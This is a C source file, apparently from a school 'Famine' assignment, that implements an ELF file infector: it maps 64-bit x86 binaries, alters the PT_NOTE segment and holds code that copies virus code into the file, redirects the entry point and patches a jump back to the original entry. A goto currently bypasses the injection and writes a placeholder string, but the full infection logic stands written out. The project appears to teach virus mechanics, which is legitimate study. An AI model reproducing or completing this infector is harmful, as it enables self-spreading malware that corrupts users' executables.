/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/07 09:51:11 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

static bool		parsing(byte *file, const struct stat file_stat, elf_data *data);

//	Infects the file located at path
//
//	Returns true on a critical error that needs to stop the whole infection program
bool	infect(profiling *this, const str path) {
	int64_t		fd = 0;
	int64_t		ret = 0;
	struct stat file_stat = {0};
	byte		*file_origin = NULL;
	elf_data	data;

	(void)fd;
	(void)ret;
	(void)this;

	open(fd, path, O_RDWR);
	if (fd < 0) {
		printf(FILE_LINE("open failed: %ld\n"), ret);
		return false;
	}

	fstat(ret, fd, &file_stat);
	if (ret) {
		printf(FILE_LINE("fstat failed: %ld\n"), ret);
	}

	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
		goto infect_end;

	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (file_origin == MAP_FAILED) {
		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
		return true;
	}

	data.mmap_size = file_stat.st_size;
	data.fd = fd;

	// Logic starts
	if (parsing(file_origin, file_stat, &data) == false) {
		printf("%s is already infected or not compatible\n", path);
		goto infect_end;
	}

	//	Change the PT_NOTE segment
	change_note_segment(this, &data);

	ft_memcpy(data.file + data.infection_offset, (byte *)"Le virus aurait ete ici", 27);

	goto infect_end;
	//	Copy the code
	ft_memcpy(data.file + data.infection_offset, this->start_rip, this->size);
	
	//	Change the entrypoint
	data.elf->e_entry = data.infection_offset;
	
	//	Copy signature
	ft_memcpy(data.file + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
	printf("Written %s at 0x%lx\n", data.file + data.infection_offset + this->size + SIGNATURE_OFFSET,
		data.infection_offset + this->size + SIGNATURE_OFFSET);

	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12;


	write(ret, 1, &new_jump, 4);
	ft_memcpy(data.file + data.infection_offset + this->size - 16, (byte *)&new_jump, 4);
	write(ret, 1, data.file + data.infection_offset + this->size - 16, 4);

	// Logic ends
	infect_end:
	munmap(ret, data.file, file_stat.st_size);
	close(fd);

	return false;
}

//	Check if the file is compatible for infection and parses the required data
//		in the elf_data *data argument
//
//	Returns true if it's compatible
//	Returns false if it's not
static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
	(void)file_stat;

	if (((uint32_t *)file)[0] != 0x464c457f)
		return false;

	if (file[EI_CLASS] != ELFCLASS64 || file[EI_DATA] != ELFDATA2LSB)
		return false;

	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64)
		return false;

	data->file = file;
	data->elf = (Elf64_Ehdr *)file;
	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
	data->original_entry_point = data->elf->e_entry;

	return true;
}

